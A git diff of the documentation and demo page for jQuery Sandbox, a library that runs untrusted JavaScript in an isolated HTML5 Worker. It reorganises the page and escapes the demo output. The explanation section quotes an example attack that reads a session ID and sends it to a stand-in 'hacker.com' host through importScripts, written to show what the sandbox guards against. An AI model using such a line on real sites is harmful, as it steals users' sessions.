@@ -3,7 +3,10 @@
 <head>
 <meta charset="utf-8">
 <title>jQuery Sandbox</title>
+<meta name="description" content="Execute untrusted headless Javascript code in a sandbox.">
 <link href="//netdna.bootstrapcdn.com/twitter-bootstrap/2.0.4/css/bootstrap.min.css" rel="stylesheet" type="text/css">
+<link href="//netdna.bootstrapcdn.com/twitter-bootstrap/2.0.4/css/bootstrap-responsive.min.css" rel="stylesheet" type="text/css">
+<link href="http://twitter.github.com/bootstrap/assets/js/google-code-prettify/prettify.css"rel=" stylesheet" type="text/css">
 <style type="text/css">
 body
 {
@@ -16,7 +19,7 @@ textarea
     -moz-box-sizing: border-box;
     box-sizing: border-box;
     width: 100%;
-    min-height: 280px;
+    min-height: 380px;
     resize: vertical;
 }
 
@@ -41,7 +44,6 @@ label
     font-weight: bold;
 }
 </style>
-<link href="//netdna.bootstrapcdn.com/twitter-bootstrap/2.0.4/css/bootstrap-responsive.min.css" rel="stylesheet" type="text/css">
 </head>
 <body>
 <a href="https://github.com/ziyan/jquery-sandbox/"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_green_007200.png" alt="Fork me on GitHub"></a>
@@ -52,6 +54,54 @@ label
 <h1>jQuery Sandbox</h1>
 <p class="lead">Execute untrusted headless Javascript code in a sandbox.</p>
 </header>
+
+
+<section>
+<h2>Demo</h2><hr/>
+<div class="row">
+<div class="span6">
+<p>Type some script to be executed in a sandbox. Your script will be terminated after 5 seconds.</p>
+<br/>
+<form class="form">
+<fieldset class="control-group">
+<label class="control-label" for="sandbox">Untrusted Javascript code</label>
+<div class="controls">
+<textarea id="sandbox">
+// Provide some API for your data model so that your user can easily script.
+// This part can be always loaded into the sandbox first.
+var TwitterApi = {}
+TwitterApi.tweet = function(content) {
+    postMessage({
+        action: 'tweet',
+        content: content,
+    });
+};
+
+// Now load user created scripts.
+setInterval(function() {
+    TwitterApi.tweet('I tweet once in a while.');
+}, 1000);
+
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'worker.js', false);
+xhr.send();
+TwitterApi.tweet("I tweet the length of a js file: " + xhr.responseText.length);
+</textarea>
+</div>
+</fieldset>
+<div class="form-actions">
+<button type="submit" class="btn btn-primary">Run in sandbox</button>
+</div>
+</form>
+</div>
+<div class="span6">
+<h3>Output</h3>
+<p>This example will simply print out what the script has posted via <code>postMessage</code>. In your handler, you should sanitize these messages from the script and do something useful with them.</p>
+<br/>
+<div id="output"></div>
+</div>
+</div>
+</section>
 
 <section>
 <h2>How does it work?</h2>
@@ -64,25 +114,39 @@ Quite simple, actually.
 <li>
 <strong>jQuery Sandbox runs untrusted javascript in a HTML5 Worker which does not have access to the DOM.</strong>
 This mechanism ensures that the script cannot manipulate elements in your DOM, read your cookie or annoy your visitors with popups.
-However, it alone is not enough. For example:<br/><br/>
-<pre><code>var xhr = new XMLHttpRequest();
+However, it alone is not enough. Consider this attack:<br/><br/>
+<pre class="prettyprint">
+var xhr = new XMLHttpRequest();
 xhr.open('GET', '/session_id', false);
 xhr.send();
 var session_id = xhr.responseText;
-
-importScripts('http://hacker.com/track.js?session_id=' + session_id);</code></pre>
+importScripts('http://hacker.com/track.js?session_id=' + session_id);
+</pre>
 </li>
 <li>
-<strong>The Worker is also hosted on a seperate domain (anything other than your own domain) such that protection from browser's cross origin resource sharing (CORS) policy kicks in, further restricting malicious code.</strong>
-This will ensure that the script cannot read your local storage, use XMLHttpRequest to steal cookie and other data from pages on your site. (It can steal anything from our host domain, which does not have anything valuable.)
+<strong>The Worker is hosted on a different domain such that protection from browser's cross origin resource sharing (CORS) policy kicks in, further restricting malicious code.</strong>
+This will ensure that the script cannot read your local storage, use XMLHttpRequest to steal cookie and other data from pages on your site. Malicious script can still access anything from our host domain, but we have nothing valuable.
 </li>
 </ol>
+<br/><br/>
+<h3>Installation</h3>
+<p>You will need the latest jQuery and this script:</p>
+<p><pre class="prettyprint">
+&lt;script type="text/javascript" src="//d3ltuim8m8ytq2.cloudfront.net/jquery-sandbox/0.0.1/jquery.sandbox.js"&gt;&lt;/script&gt;
+</pre></p>
+<p>The source can be found on github: <a href="https://github.com/ziyan/jquery-sandbox/blob/master/jquery.sandbox.js">https://github.com/ziyan/jquery-sandbox/blob/master/jquery.sandbox.js</a></p>
+<p>Actually, the real source is in CoffeeScript: <a href="https://github.com/ziyan/jquery-sandbox/blob/master/src/js/jquery.sandbox.coffee">https://github.com/ziyan/jquery-sandbox/blob/master/src/js/jquery.sandbox.coffee</a></p>
+<br/><br/>
+<h3>Limitations</h3>
+<p>Since jQuery Sandbox depends on HTML5 Worker, it will not work with IE[6-9]. However, it has been tested on the following browsers:
+<ul>
+    <li>IE 10.0</li>
+    <li>Latest Chrome</li>
+    <li>Latest Firefox</li>
+</ul>
+</p>
 </div>
 <div class="span6">
-<h3>Installation</h3>
-<p>You will need the latest jQuery. </p>
-<p><pre><code>&lt;script type="text/javascript" src="//d3ltuim8m8ytq2.cloudfront.net/jquery-sandbox/0.0.1/jquery.sandbox.js"&gt;&lt;/script&gt;</code></pre></p>
-<br/><br/>
 <h3>Usage</h3>
 <p>The script does nothing until you call it via <code>$.sandbox(options)</code>.</p>
 <p><code>options</code> is a dictionary with the following keys:
@@ -93,63 +157,26 @@ This will ensure that the script cannot read your local storage, use XMLHttpRequ
 <li><strong>callback</strong> (optional) - Function to be called when the script does <code>postMessage()</code> or throws exception. Should be defined as <code>function(data, error) { ... }</code></li>
 </ul>
 </p>
-<p><code>var sandbox = $.sandbox(options);</code> also returns a sandbox object. You may call <code>sandbox.terminate();</code> to kill the running script</p>
+<p><pre class="prettyprint">
+var sandbox = $.sandbox({
+    timeout: 5000,
+    scripts: [
+        '//yourdomain.com/assets/js/api.js',
+        'data:application/javascript,' + encodeURIComponent(script1),
+        'data:application/javascript,' + encodeURIComponent(script2),
+    ],
+    callback: function(data, error) {
+        if (error !== undefined) this.terminate();
+    }
+});
+
+$('a#terminate').click(function(e) {
+    // Termination on demand.
+    sandbox.terminate();
+});
+</pre></p>
 
 </div>
-</div>
-</section>
-
-<section>
-<h2>Demo</h2><hr/>
-<div class="row">
-<div class="span6">
-<p>This demo has a timeout setting of 5000, which means your script will be terminated after 5 seconds.</p>
-<br/><br/>
-<form class="form">
-<fieldset class="control-group">
-<label class="control-label" for="sandbox">Untrusted Javascript code</label>
-<div class="controls">
-<textarea id="sandbox">
-setInterval(function() {
-    postMessage("I run once a while.");
-}, 1000);
-
-var xhr = new XMLHttpRequest();
-xhr.open('GET', 'worker.js', false);
-xhr.send();
-postMessage("XHR got some data back: " + xhr.responseText.length);
-</textarea>
-</div>
-</fieldset>
-<div class="form-actions">
-<button type="submit" class="btn btn-primary">Run in sandbox</button>
-</div>
-</form>
-</div>
-<div class="span6">
-<h3>Output</h3>
-<br/>
-<div id="output">
-<div class="alert alert-success">Press "Run in sandbox" to execute your script.</div>
-</div>
-</div>
-</div>
-</section>
-
-<section>
-<h2>Limitations</h2>
-<hr/>
-<div class="row">
-<div class="span6">
-<p>Since jQuery Sandbox depends on HTML5 Worker, it will not work with IE[6-9]. However, it has been tested on the following browsers:
-<ul>
-    <li>IE 10.0</li>
-    <li>Latest Chrome</li>
-    <li>Latest Firefox</li>
-</ul>
-</p>
-</div>
-<div class="span6">
 </div>
 </section>
 
@@ -157,12 +184,25 @@ postMessage("XHR got some data back: " + xhr.responseText.length);
 
 <script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js"></script>
 <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/2.0.4/bootstrap.min.js"></script>
+<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/google-code-prettify/prettify.js"></script>
 <script type="text/javascript" src="//d3ltuim8m8ytq2.cloudfront.net/jquery-sandbox/0.0.1/jquery.sandbox.js"></script>
 <script type="text/javascript">
 $(function() {
+    window.prettyPrint && prettyPrint();
+
     var output = $('#output');
+    if ($.support.sandbox) {
+        message = $('<div class="alert alert-success"><strong>Awesome!</strong> Your browser does support HTML5 Worker, this should work.</div>');
+        message.prependTo($('form:first'));
+    }
+    else {
+        message = $('<div class="alert alert-error">Unfortunately, your browser does not support HTML5 Worker yet, thus jQuery Sandbox will not run.</div>');
+        message.prependTo($('form:first'));
+    }
+
     var sandbox = null;
-    $('form').submit(function (e) {
+
+    $('form:first').submit(function (e) {
         e.preventDefault();
 
         var script = $('textarea#sandbox').val();
@@ -182,12 +222,12 @@ $(function() {
                     if (typeof(data) !== 'string') {
                         data = JSON.stringify(data);
                     }
-                    $('<div />').addClass('alert alert-info').html(data).appendTo(output);
+                    $('<div />').addClass('alert alert-info').text(data).appendTo(output);
                     return;
                 }
  
                 if (error === 'timeout') {
-                    $('<div />').addClass('alert alert-error').html('Script terminated due to time limit.').appendTo(output);
+                    $('<div />').addClass('alert alert-error').html('Script terminated due to reaching of time limit.').appendTo(output);
                     this.terminate();
                     sandbox = null;
                     return;
